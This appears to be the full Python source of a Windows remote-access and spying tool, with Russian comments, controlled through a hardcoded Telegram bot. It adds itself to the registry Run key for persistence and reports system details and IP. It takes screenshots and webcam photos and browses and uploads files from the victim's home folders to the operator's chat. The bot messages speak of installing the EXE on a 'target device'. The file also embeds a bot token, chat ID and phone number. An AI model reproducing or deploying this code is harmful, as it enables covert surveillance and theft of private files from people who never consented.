import os
import platform
import psutil
import time
import requests
import sys
import winreg
import socket
from datetime import datetime
import json
import threading
import pyautogui
import tempfile
import cv2
from pathlib import Path

# Конфигурация Telegram
TELEGRAM_BOT_TOKEN = '8200230299:AAEB-Tbaq5BCgUolnCe_S_qH3JyTRvtPll8'
TELEGRAM_CHAT_ID = '5298777521'
SECOND_ACCOUNT_PHONE = '89152898250'

# Путь для автозагрузки
AUTOSTART_KEY = r"Software\Microsoft\Windows\CurrentVersion\Run"
APP_NAME = "SystemMonitor"
SCRIPT_PATH = os.path.abspath(sys.argv[0])

# Глобальные переменные
start_time = datetime.now()
last_update_id = 0
monitoring_active = True
current_directory = os.path.expanduser("~")  # Начинаем с домашней директории
pending_messages = {}  # Для хранения ID сообщений

def get_system_info():
    """Сбор информации о системе"""
    info = {
        "OS": platform.system(),
        "OS Version": platform.version(),
        "OS Release": platform.release(),
        "Architecture": platform.machine(),
        "Processor": platform.processor(),
        "RAM": f"{round(psutil.virtual_memory().total / (1024**3), 2)} GB",
        "CPU Cores": psutil.cpu_count(logical=False),
        "Logical CPUs": psutil.cpu_count(logical=True),
    }
    return info

def get_ip_address():
    """Получение IP-адреса"""
    try:
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)
        return ip_address
    except Exception as e:
        print(f"Error getting IP: {e}")
        return "Unknown"

def get_uptime():
    """Получение времени работы мониторинга"""
    uptime = datetime.now() - start_time
    hours, remainder = divmod(int(uptime.total_seconds()), 3600)
    minutes, seconds = divmod(remainder, 60)
    return f"{hours}h {minutes}m {seconds}s"

def send_telegram_message(text, reply_markup=None, message_id=None):
    """Отправка или редактирование сообщения в Telegram"""
    if message_id:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/editMessageText"
        payload = {
            'chat_id': TELEGRAM_CHAT_ID,
            'message_id': message_id,
            'text': text,
            'parse_mode': 'HTML',
            'reply_markup': json.dumps(reply_markup) if reply_markup else None
        }
    else:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {
            'chat_id': TELEGRAM_CHAT_ID,
            'text': text,
            'parse_mode': 'HTML',
            'reply_markup': json.dumps(reply_markup) if reply_markup else None
        }
    
    try:
        response = requests.post(url, data=payload, timeout=10)
        if response.json().get('ok'):
            return response.json()['result']['message_id']
        print(f"Telegram API error: {response.json()}")
    except Exception as e:
        print(f"Error sending message: {e}")
    return None

def send_telegram_photo(photo_path, caption=None):
    """Отправка фото в Telegram"""
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
    with open(photo_path, 'rb') as photo:
        files = {'photo': photo}
        data = {'chat_id': TELEGRAM_CHAT_ID}
        if caption:
            data['caption'] = caption
        try:
            response = requests.post(url, files=files, data=data)
            return response.json()
        except Exception as e:
            print(f"Error sending photo: {e}")
            return None

def send_telegram_document(document_path, caption=None):
    """Отправка документа в Telegram"""
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
    with open(document_path, 'rb') as doc:
        files = {'document': doc}
        data = {'chat_id': TELEGRAM_CHAT_ID}
        if caption:
            data['caption'] = caption
        try:
            response = requests.post(url, files=files, data=data)
            return response.json()
        except Exception as e:
            print(f"Error sending document: {e}")
            return None

def take_screenshot(callback_message_id):
    """Создание скриншота с уведомлением о процессе"""
    try:
        processing_msg_id = send_telegram_message("⏳ Делаю скриншот...")
        
        with tempfile.NamedTemporaryFile(suffix='.png', delete=False) as tmp:
            screenshot_path = tmp.name
        
        pyautogui.screenshot(screenshot_path)
        
        if processing_msg_id:
            delete_telegram_message(processing_msg_id)
        
        send_telegram_photo(
            screenshot_path, 
            caption="📸 Скриншот готов"
        )
        
        os.unlink(screenshot_path)
        return True
    except Exception as e:
        print(f"Error taking screenshot: {e}")
        if processing_msg_id:
            send_telegram_message(f"⚠️ Ошибка при создании скриншота: {str(e)}")
        return False

def take_webcam_photo(callback_message_id):
    """Создание фото с веб-камеры с уведомлением о процессе"""
    try:
        processing_msg_id = send_telegram_message("⏳ Делаю фото с камеры...")
        
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        cap.release()
        
        if not ret:
            if processing_msg_id:
                delete_telegram_message(processing_msg_id)
            send_telegram_message("⚠️ Не удалось получить доступ к камере")
            return False
        
        with tempfile.NamedTemporaryFile(suffix='.jpg', delete=False) as tmp:
            photo_path = tmp.name
        
        cv2.imwrite(photo_path, frame)
        
        if processing_msg_id:
            delete_telegram_message(processing_msg_id)
        
        send_telegram_photo(
            photo_path, 
            caption="📷 Фото с камеры готово"
        )
        
        os.unlink(photo_path)
        return True
    except Exception as e:
        print(f"Error taking webcam photo: {e}")
        if processing_msg_id:
            send_telegram_message(f"⚠️ Ошибка при создании фото: {str(e)}")
        return False

def delete_telegram_message(message_id):
    """Удаление сообщения в Telegram"""
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/deleteMessage"
    payload = {
        'chat_id': TELEGRAM_CHAT_ID,
        'message_id': message_id
    }
    try:
        requests.post(url, data=payload, timeout=5)
    except Exception as e:
        print(f"Error deleting message: {e}")

# ================== Файловый менеджер ==================

def sanitize_filename(name):
    """Очистка имени файла для callback_data"""
    # Заменяем недопустимые символы, ограничиваем длину
    cleaned = ''.join(c if c.isalnum() or c in ' _-.' else '_' for c in name)
    return cleaned[:32]  # Telegram имеет ограничение на длину callback_data

def list_directory(path=None):
    """Получение списка файлов и папок"""
    global current_directory
    
    if path:
        if path == "..":
            # Переход на уровень выше
            new_path = Path(current_directory).parent
            if str(new_path) >= str(Path.home()):  # Не выходим выше домашней директории
                current_directory = str(new_path)
        elif os.path.isabs(path):
            # Абсолютный путь
            if path.startswith(str(Path.home())):  # Проверяем, что остаемся в домашней директории
                current_directory = path
        else:
            # Относительный путь
            new_path = os.path.join(current_directory, path)
            if os.path.exists(new_path) and new_path.startswith(str(Path.home())):
                current_directory = new_path
    
    try:
        items = os.listdir(current_directory)
        dirs = [d for d in items if os.path.isdir(os.path.join(current_directory, d))]
        files = [f for f in items if os.path.isfile(os.path.join(current_directory, f))]
        return dirs, files, None
    except Exception as e:
        return None, None, f"⚠️ Ошибка доступа: {str(e)}"

def create_file_manager_keyboard(dirs, files):
    """Создание клавиатуры для файлового менеджера"""
    keyboard = []
    
    # Добавляем быстрые папки (первые 3 в ряд)
    special_folders = get_special_folders()
    if special_folders:
        quick_access = []
        for name, path in special_folders.items():
            if os.path.exists(path):
                quick_access.append({
                    "text": f"🚀 {name}",
                    "callback_data": f"fm:quick:{sanitize_filename(path)}"
                })
        
        # Разбиваем на ряды по 3 кнопки
        for i in range(0, len(quick_access), 3):
            keyboard.append(quick_access[i:i+3])
    
    # Кнопка для перехода на уровень выше
    if current_directory != str(Path.home()):
        keyboard.append([{"text": "📂 На уровень выше", "callback_data": "fm:up"}])
    
    # Кнопки для папок в текущей директории
    for d in sorted(dirs)[:15]:  # Ограничиваем количество
        safe_name = sanitize_filename(d)
        keyboard.append([{"text": f"📁 {d}", "callback_data": f"fm:dir:{safe_name}"}])
    
    # Кнопки для файлов
    for f in sorted(files)[:15]:
        size = os.path.getsize(os.path.join(current_directory, f))
        size_str = f"{size/1024:.1f} KB" if size < 1024*1024 else f"{size/(1024*1024):.1f} MB"
        safe_name = sanitize_filename(f)
        keyboard.append([{"text": f"📄 {f} ({size_str})", "callback_data": f"fm:file:{safe_name}"}])
    
    # Кнопка возврата в главное меню
    keyboard.append([{"text": "🔙 Главное меню", "callback_data": "main_menu"}])
    
    return {"inline_keyboard": keyboard}

def send_file_manager(message_id=None):
    """Отправка или обновление файлового менеджера"""
    dirs, files, error = list_directory()
    
    if error:
        text = error
        keyboard = None
    else:
        text = f"📂 Текущая папка:\n<code>{current_directory}</code>\n\n"
        text += f"📁 Папок: {len(dirs)}\n"
        text += f"📄 Файлов: {len(files)}\n\n"
        text += "🚀 <b>Быстрые папки:</b> Документы, Загрузки, Рабочий стол"
        keyboard = create_file_manager_keyboard(dirs, files)
    
    if message_id:
        send_telegram_message(text, reply_markup=keyboard, message_id=message_id)
    else:
        send_telegram_message(text, reply_markup=keyboard)

def download_file(file_name):
    """Отправка файла пользователю"""
    file_path = os.path.join(current_directory, file_name)
    
    if not os.path.exists(file_path):
        send_telegram_message(f"⚠️ Файл {file_name} не найден")
        return
    
    file_size = os.path.getsize(file_path)
    if file_size > 50 * 1024 * 1024:  # 50MB лимит Telegram
        send_telegram_message(f"⚠️ Файл слишком большой ({file_size/(1024*1024):.1f} MB). Максимум 50MB.")
        return
    
    try:
        send_telegram_message(f"⏳ Отправляю файл: {file_name} ({file_size/1024:.1f} KB)...")
        send_telegram_document(file_path, caption=f"📄 {file_name}")
    except Exception as e:
        send_telegram_message(f"⚠️ Ошибка отправки файла: {str(e)}")

def handle_fm_callback(data_parts, message_id):
    """Обработка callback от файлового менеджера"""
    global current_directory
    
    if data_parts[1] == 'up':
        # Переход на уровень выше
        new_path = Path(current_directory).parent
        if str(new_path) >= str(Path.home()):
            current_directory = str(new_path)
        send_file_manager(message_id)
    
    elif data_parts[1] == 'quick':
        # Обработка быстрых папок
        path = ':'.join(data_parts[2:])
        if os.path.exists(path):
            current_directory = path
            send_file_manager(message_id)
        else:
            send_telegram_message(f"Папка недоступна: {path}")
    
    elif data_parts[1] == 'dir':
        # Обработка обычных папок
        safe_name = ':'.join(data_parts[2:])
        dirs, _, _ = list_directory()
        if dirs:
            for d in dirs:
                if sanitize_filename(d) == safe_name:
                    list_directory(d)
                    send_file_manager(message_id)
                    break
    
    elif data_parts[1] == 'file':
        # Обработка файлов
        safe_name = ':'.join(data_parts[2:])
        _, files, _ = list_directory()
        if files:
            for f in files:
                if sanitize_filename(f) == safe_name:
                    download_file(f)
                    break

def get_special_folders():
    """Получение путей к стандартным папкам Windows"""
    try:
        import ctypes
        from ctypes import windll, create_unicode_buffer
        
        # Константы для специальных папок Windows
        CSIDL_DESKTOP = 0x0000        # Рабочий стол
        CSIDL_PERSONAL = 0x0005       # Документы
        CSIDL_DOWNLOADS = 0x002c      # Загрузки
        
        SHGFP_TYPE_CURRENT = 0   # Получить текущий путь (не умолчательный)
        
        # Создаем буфер для пути
        buf = create_unicode_buffer(ctypes.wintypes.MAX_PATH)
        
        folders = {}
        
        # Функция для получения пути
        def get_folder_path(csidl):
            if windll.shell32.SHGetFolderPathW(None, csidl, None, SHGFP_TYPE_CURRENT, buf) == 0:
                return buf.value
            return None
        
        # Получаем пути
        if path := get_folder_path(CSIDL_DESKTOP):
            folders["Рабочий стол"] = path
        if path := get_folder_path(CSIDL_PERSONAL):
            folders["Документы"] = path
        if path := get_folder_path(CSIDL_DOWNLOADS):
            folders["Загрузки"] = path
            
        return folders
    
    except Exception as e:
        print(f"Error getting special folders: {e}")
        # Возвращаем стандартные пути как fallback
        return {
            "Рабочий стол": os.path.join(os.path.expanduser("~"), "Desktop"),
            "Документы": os.path.join(os.path.expanduser("~"), "Documents"),
            "Загрузки": os.path.join(os.path.expanduser("~"), "Downloads")
        }

# ================== Основные функции ==================
def send_status():
    """Отправка статуса системы"""
    system_info = get_system_info()
    status_message = (
        f"<b>📊 Статус системы</b>\n\n"
        f"<b>🖥 ОС:</b> {system_info['OS']} {system_info['OS Version']}\n"
        f"<b>🔌 IP-адрес:</b> <code>{get_ip_address()}</code>\n"
        f"<b>⏳ Время работы:</b> {get_uptime()}\n"
        f"<b>💾 ОЗУ:</b> {system_info['RAM']}\n"
        f"<b>⚙️ Процессор:</b> {system_info['Processor']} ({system_info['CPU Cores']} ядер)"
    )
    send_telegram_message(status_message)

def create_main_keyboard():
    """Создание основной клавиатуры"""
    keyboard = {
        "inline_keyboard": [
            [
                {"text": "🔄 Статус", "callback_data": "show_status"},
                {"text": "📸 Скриншот", "callback_data": "take_screenshot"}
            ],
            [
                {"text": "📷 Камера", "callback_data": "take_webcam_photo"},
                {"text": "📁 Файлы", "callback_data": "show_files"}
            ],
            [
                {"text": "🛑 Остановить", "callback_data": "stop_monitoring"}
            ]
        ]
    }
    return keyboard

def stop_monitoring():
    """Остановка мониторинга"""
    global monitoring_active
    monitoring_active = False
    remove_from_autostart()
    send_telegram_message("✅ <b>Мониторинг остановлен</b>\n\nПрограмма удалена из автозагрузки.")
    os._exit(0)

def send_welcome_message():
    """Отправляет приветственное сообщение с предупреждением"""
    welcome_text = (
        "⚠️ <b>ВНИМАНИЕ: Конфиденциальность</b> ⚠️\n\n"
        "Через этого бота вы сможете удаленно мониторить подключенное устройство.\n\n"
        "<b>Для подключения устройства:</b>\n"
        "1. Установите программу на целевое устройство\n"
        "2. Запустите программу от имени администратора\n"
        "3. Дождитесь автоматического подключения\n\n"
        "<b>Техподдержка:</b> @crreativve\n"
        "<b>Требования:</b> Стабильный интернет на обоих устройствах\n\n"
        "❗ Используйте только на устройствах, где у вас есть право мониторинга"
    )
    
    keyboard = {
        "inline_keyboard": [
            [{"text": "✅ Я понимаю и принимаю условия", "callback_data": "accept_terms"}],
            [{"text": "❌ Отменить", "callback_data": "cancel_setup"}]
        ]
    }
    
    send_telegram_message(welcome_text, reply_markup=keyboard)

def handle_updates():
    """Обработчик обновлений с добавленным условием"""
    global last_update_id
    
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates"
    params = {'offset': last_update_id + 1, 'timeout': 5}
    
    try:
        response = requests.get(url, params=params)
        data = response.json()
        
        if data.get('ok'):
            for update in data.get('result', []):
                last_update_id = update['update_id']
                
                # Обработка стартового сообщения
                if 'message' in update and 'text' in update['message']:
                    if update['message']['text'].lower() == '/start':
                        send_welcome_message()
                        continue
                        
                if 'callback_query' in update:
                    # Обработка принятия условий
                    if update['callback_query']['data'] == 'accept_terms':
                        send_telegram_message(
                            "🛠️ <b>Настройка подключения</b>\n\n"
                            "1. Скачайте программу по ссылке: [ссылка_на_программу]\n"
                            "2. Запустите EXE-файл на целевом устройстве\n"
                            "3. Дождитесь автоматического подключения\n\n"
                            "<i>Программа требует прав администратора для установки</i>"
                        )
                        continue
                        
                    elif update['callback_query']['data'] == 'cancel_setup':
                        send_telegram_message("❌ Настройка отменена")
                        continue
                    
                    elif update['callback_query']['data'] == 'show_status':
                        send_status()
                    elif update['callback_query']['data'] == 'take_screenshot':
                        threading.Thread(target=take_screenshot, args=(message_id,)).start()
                    elif update['callback_query']['data'] == 'take_webcam_photo':
                        threading.Thread(target=take_webcam_photo, args=(message_id,)).start()
                    elif update['callback_query']['data'] == 'show_files':
                        current_directory = os.path.expanduser("~")  # Сброс к домашней директории
                        send_file_manager()
                    elif update['callback_query']['data'] == 'main_menu':
                        send_telegram_message("Главное меню:", reply_markup=create_main_keyboard(), message_id=message_id)
                    elif update['callback_query']['data'] == 'stop_monitoring':
                        stop_monitoring()
                
                elif 'message' in update and 'text' in update['message']:
                    text = update['message']['text'].lower()
                    message_id = update['message']['message_id']
                    
                    if text == '/status':
                        send_status()
                    elif text == '/screenshot':
                        threading.Thread(target=take_screenshot, args=(message_id,)).start()
                    elif text == '/photo':
                        threading.Thread(target=take_webcam_photo, args=(message_id,)).start()
                    elif text == '/files':
                        current_directory = os.path.expanduser("~")  # Сброс к домашней директории
                        send_file_manager()
                    elif text == '/stop':
                        stop_monitoring()
    
    except Exception as e:
        print(f"Error handling updates: {e}")

def add_to_autostart():
    """Добавление программы в автозагрузку"""
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, AUTOSTART_KEY, 0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, APP_NAME, 0, winreg.REG_SZ, SCRIPT_PATH)
        winreg.CloseKey(key)
        return True
    except Exception as e:
        print(f"Error adding to autostart: {e}")
        return False

def remove_from_autostart():
    """Удаление программы из автозагрузки"""
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, AUTOSTART_KEY, 0, winreg.KEY_WRITE)
        winreg.DeleteValue(key, APP_NAME)
        winreg.CloseKey(key)
        return True
    except Exception as e:
        print(f"Error removing from autostart: {e}")
        return False

def is_admin():
    """Проверка на административные права"""
    try:
        return os.getuid() == 0
    except AttributeError:
        import ctypes
        return ctypes.windll.shell32.IsUserAnAdmin() != 0

def monitor_processes():
    """Мониторинг новых процессов"""
    keyboard = create_main_keyboard()
    send_telegram_message(
        "<b>🔔 Мониторинг системы активирован</b>\n\n"
        "Используйте кнопки ниже для управления:",
        reply_markup=keyboard
    )
    
    while monitoring_active:
        handle_updates()
        time.sleep(1)

def handle_command(command):
    """Обработка команд"""
    if command == '--autostart':
        if add_to_autostart():
            print("Добавлено в автозагрузку")
        else:
            print("Ошибка добавления в автозагрузку")
    elif command == '--remove':
        if remove_from_autostart():
            print("Удалено из автозагрузки")
        else:
            print("Ошибка удаления из автозагрузки")
    elif command == '--stop':
        if remove_from_autostart():
            print("Мониторинг остановлен и удален из автозагрузки")
        else:
            print("Ошибка удаления из автозагрузки")
        sys.exit(0)
    else:
        print("Неизвестная команда")

if __name__ == "__main__":
    if len(sys.argv) > 1:
        handle_command(sys.argv[1])
    else:
        if not is_admin():
            print("Предупреждение: Программа запущена без прав администратора")
        
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, AUTOSTART_KEY, 0, winreg.KEY_READ)
            winreg.QueryValueEx(key, APP_NAME)
            winreg.CloseKey(key)
            print("Режим мониторинга (в автозагрузке)")
        except:
            print("Временный режим (не в автозагрузке)")
        
        monitor_processes()